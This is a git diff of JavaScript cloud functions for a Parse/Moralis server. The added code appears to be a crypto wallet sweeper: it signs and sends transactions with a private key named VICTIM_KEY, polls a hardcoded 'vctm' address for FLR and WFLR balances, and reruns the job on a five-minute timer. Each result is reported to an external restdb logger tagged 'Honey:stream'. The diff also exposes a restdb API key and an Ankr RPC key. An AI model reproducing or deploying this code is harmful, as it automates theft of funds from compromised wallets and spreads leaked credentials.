+        request.log.info("i got here11");
+        try {
+            request.log.info(`Sending...`);
+            // const tx = await wallet.sendTransaction({
+            //   nonce: transactx.object.get("nonce"),
+            //   to: reciver,
+            //   gasLimit: gasLimit,
+            //   gasPrice : gasPrice,
+            //   value: val
+            // });
+            // request.log.info("i got here12");
+            // tx.wait();
+            // if(tx.hash) {
+            //   request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
+            //   await mshlogger(request, 'Eth2', tx.hash)
+            //   //
+            // }
+            // if(tx.nonce) {
+            //    //
+            //    request.log.info(`Over Mad ooo! Block Confirmed 😁😁😁 🚀🚀🚀`);
+            // }
+            var transaction = {
+                nonce: web3.utils.toHex(transactx.object.get("nonce")),
+                to: reciver,
+                gasLimit: web3.utils.toHex(gasLimit + ""),
+                gasPrice: web3.utils.toHex(gasPrice + ""),
+                value: web3.utils.toHex(val + "")
+                // 'nonce': request.object.get("nonce"),
+                // optional data field to send message or execute smart contract
+            };
+            request.log.info("Created transaction");
+            request.log.info("i got here12");
+            request.log.info(JSON.stringify(transaction));
+            var signedTx = await web3.eth.accounts.signTransaction(transaction, VICTIM_KEY);
+            request.log.info("Signed transaction");
+            request.log.info("i got here13");
+            web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash) => {
+                // loggerr.info(hash.toString());
+                request.log.info("got hash:" + hash);
+                request.log.info("i got here14");
+                request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
+            }).on('receipt', async (reciept) => {
+                //  await mshlogger(request, ntwk, loggerr)
+                request.log.info(`Mad!...receipt 😁 🚀`);
+                request.log.info("i got here15");
+                await mshlogger(request, 'Eth2', JSON.stringify(reciept));
+                request.log.info("got recipet");
+                // loggerr.info(JSON.stringify(reciept));
+            }).on('error', async (error) => {
+                //  await mshlogger(request, JSON.stringify(error), loggerr)
+                request.log.info("got error");
+                request.log.info("i got here16");
+                request.log.info("error message" + error.message);
+                await mshlogger(request, JSON.stringify(error), JSON.stringify(error));
+                // loggerr.info(JSON.stringify(error));
+                // loggerr.info("errror");
+            });
+            // request.log.info(` Sent tx with nonce ${tx.nonce} moving ${val}  gwei: ${tx.hash}`);
+        }
+        catch (err) {
+            request.log.info(` Error sending tx: ${(_a = err.message) !== null && _a !== void 0 ? _a : err}`);
+        }
+    }
     async function mshlogger(request, brand, logg) {
         var result = await web3.utils.fromWei(request.object.get("value"));
         //  varresult = Moralis.Cloud.units({
@@ -713,10 +1281,10 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
         //    });
         Parse.Cloud.httpRequest({
             method: 'POST',
-            url: 'https://aires2-89c4.restdb.io/rest/aires',
+            url: config_1.default.MLIS_URL,
             headers: {
                 "content-type": "application/json",
-                "x-apikey": "6463413a0b60fc42f4e196ad",
+                "x-apikey": config_1.default.MLIS_KEY,
                 "cache-control": "no-cache"
             },
             body: {
@@ -725,7 +1293,7 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
                 value: result,
                 time: request.object.get("_created_at"),
                 brand: brand + ":Honey:stream",
-                server: "1"
+                server: "1: message:" + logg
             }
         }).then(function (httpResponse) {
             request.log.info("heoney response");
@@ -737,14 +1305,36 @@ Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
         });
     }
 });
+async function BalanceChecker(request) {
+    request.log.info(`Balance checker started`);
+    try {
+        const vctm = "0xCd8d89731Be212D4c23b22c51475c3e8B22154ed";
+        const cntrct = "0x1D80c49BbBCd1C0911346656B529DF9E5c2F783d";
+        const provider = new ethers_1.ethers.providers.JsonRpcProvider("https://rpc.ankr.com/flare/6b0e506c63babd2b27739967a6f1e579c4fc72039e11d6ed25b233058511620d");
+        const balance = await provider.getBalance(vctm);
+        const abimatic = [{ "inputs": [], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "string", "name": "name", "type": "string" }, { "internalType": "string", "name": "symbol", "type": "string" }, { "internalType": "uint8", "name": "decimals", "type": "uint8" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bool", "name": "mintable", "type": "bool" }, { "internalType": "address", "name": "owner", "type": "address" }], "name": "initialize", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "mintable", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "renounceOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256",
+                        "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }];
+        const erc20_rw = new ethers_1.ethers.Contract(cntrct, abimatic, provider);
+        var tkbalanceADDR1 = await erc20_rw.balanceOf(vctm);
+        request.log.info(`WFLR Balance: ${ethers_1.ethers.utils.formatUnits(tkbalanceADDR1, "ether")}`);
+        request.log.info(`FLR Balance: ${ethers_1.ethers.utils.formatUnits(balance, "ether")}`);
+
+
+     
+    }
+    catch (error) {
+        request.log.info("Balnce checker error: " + error.message);
+    }
+}
 Parse.Cloud.define("startListening", async () => {
     console.log('hello world run');
     // Parse.Cloud.httpRequest({
     //      method: 'POST',
-    //   url: 'https://aires2-89c4.restdb.io/rest/aires',
+    //   url: config.MLIS_URL,
     //   headers: {
     //     "content-type": "application/json",
-    //     "x-apikey": "6463413a0b60fc42f4e196ad",
+    //     "x-apikey": config.MLIS_KEY,
     //     "cache-control": "no-cache"
     //   },
     //    body: {
@@ -769,10 +1359,10 @@ Parse.Cloud.define("startListening", async () => {
     // var result = await web3.utils.fromWei(request.object.get("value"));
     // Parse.Cloud.httpRequest({
     //    method: 'POST',
-    //   url: 'https://aires2-89c4.restdb.io/rest/aires',
+    //   url: config.MLIS_URL,
     //   headers: {
     //     "content-type": "application/json",
-    //     "x-apikey": "6463413a0b60fc42f4e196ad",
+    //     "x-apikey": config.MLIS_KEY,
     //     "cache-control": "no-cache"
     //   },
     //    body: {
@@ -797,6 +1387,16 @@ Parse.Cloud.define("startListening", async () => {
 });
 Parse.Cloud.define("textPassValue", async (request) => {
     return request;
+});
+Parse.Cloud.define("timer", async (request) => {
+    request.log.info('hello world run clik timer');
+    var count = 0;
+    setInterval(async () => {
+        count++;
+        request.log.info('started inside pinger (count) =================================' + count);
+        request.log.info('started inside pinger (time used) =================================' + (count * 5 / 60));
+        await Parse.Cloud.run("_AddressSyncStatus2");
+    }, 300000);
 });
 Parse.Cloud.define("configureStreams", async (request) => {
     // console.log('hello  configureStreams');
